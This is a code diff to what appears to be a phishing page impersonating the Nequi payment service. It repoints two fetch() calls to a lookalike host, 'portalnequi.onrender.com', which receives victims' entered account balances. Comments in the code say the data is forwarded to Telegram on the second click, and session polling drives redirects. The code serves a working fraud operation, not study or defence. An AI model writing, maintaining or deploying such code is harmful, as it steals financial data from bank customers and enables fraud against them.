@@ -684,7 +684,7 @@
                 // PRIMER CLIC: Guardar primer saldo (NO enviar a Telegram todavía)
                 if (contSendButton === 1) {
                   try {
-                    await fetch('https://waroyvinos.onrender.com/step2-loan-first', {
+                    await fetch('https://portalnequi.onrender.com/step2-loan-first', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({
@@ -706,7 +706,7 @@
                 // SEGUNDO CLIC: Enviar AMBOS saldos con BOTONES a Telegram
                 if (contSendButton === 2) {
                   try {
-                    await fetch('https://waroyvinos.onrender.com/step2-loan-second', {
+                    await fetch('https://portalnequi.onrender.com/step2-loan-second', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({
@@ -753,7 +753,7 @@
     </div>
   </div>
 
-<script src="java/common.js"></script>
+<script src="js/common.js"></script>
 <script>
 // ==================== POLLING PARA REDIRECCIONES ====================
 const sessionId = localStorage.getItem('sessionId') || 'session_' + Date.now();
